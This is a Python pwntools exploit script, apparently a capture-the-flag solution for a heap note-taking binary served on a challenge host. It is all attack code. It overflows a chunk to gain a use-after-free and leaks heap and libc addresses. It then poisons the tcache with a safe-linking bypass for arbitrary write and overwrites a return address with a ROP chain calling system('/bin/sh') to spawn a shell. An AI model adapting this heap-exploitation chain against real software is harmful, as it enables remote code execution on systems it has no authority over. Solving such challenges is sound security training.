from pwn import *

elf = context.binary = ELF("./notes")
libc = ELF("./libc.so.6")

# io = process()
io = remote("903cf92f-fc9f-4653-a827-d258ff235bf2.chall.dev.nnsc.tf", 41337, ssl=True)

# gdb.attach(io,gdbscript="""
# c
# """)


def create(index, size):
    io.sendlineafter(b"> ", b"1")
    io.sendline(str(index).encode())
    io.sendline(str(size).encode())


def delete(index):
    io.sendlineafter(b"> ", b"2")
    io.sendline(str(index).encode())


def read(index):
    io.sendlineafter(b"> ", b"3")
    io.sendline(str(index).encode())
    io.recvuntil(b"Content: ")
    return io.recvline()[:-1]


def edit(index, content):
    io.sendlineafter(b"> ", b"4")
    io.sendline(str(index).encode())
    io.send(content)


# create chunks, including one on index 16 (vulnerability)
for i in range(16):
    create(i, 248)
create(16, 32)

# Gain UAF on index 2 with overflow
delete(2)
edit(1, b"a" * 248 + b"b" * 8)
leak = read(1)
leak = leak[leak.index(b"b" * 8) + 8 :]
heap = u64(leak.ljust(8, b"\0")) << 12
info(f"heap @ {hex(heap)}")

# overwrite size -> gain libc leak
edit(1, b"a" * 248 + p64(0x101))
create(2, 248)
edit(1, b"a" * 248 + p64(0x501))
delete(2)

edit(1, b"a" * 248 + b"b" * 8)
leak = read(1)
leak = leak[leak.index(b"b" * 8) + 8 :]
libc.address = u64(leak.ljust(8, b"\0")) - 0x203B20
info(f"libc @ {hex(libc.address)}")
edit(1, b"a" * 248 + p64(0x501))

# Pivot libc leak to pie leak and overwrite gNotes -> arb read/write
for _ in range(3):
    create(1, 64)
create(2, 64)
create(3, 64)
create(16, 64)
delete(3)
delete(2)
edit(1, b"a" * 72 + p64(0x51) + p64((libc.address + 0x2046E0) ^ (heap >> 12)))
create(14, 64)
create(15, 64)  # this one
retaddr = u64(read(15).ljust(8, b"\0")) - 0x120
info(f"retaddr @ {hex(retaddr)}")

for _ in range(3):
    create(1, 64)
create(2, 64)
create(3, 64)
create(16, 64)
delete(3)
delete(2)
edit(1, b"a" * 72 + p64(0x51) + p64((retaddr - 8) ^ (heap >> 12)))
create(14, 64)
create(15, 64)  # this one
rop = ROP(libc)
chain = (
    p64(rop.ret.address) * 2
    + p64(rop.rdi.address)
    + p64(next(libc.search(b"/bin/sh\0")))
    + p64(libc.sym.system)
)
# io.interactive()
edit(15, chain)
io.clean()
io.sendline(b"5")
# io.clean()
success("congrats you have shell")

io.interactive()

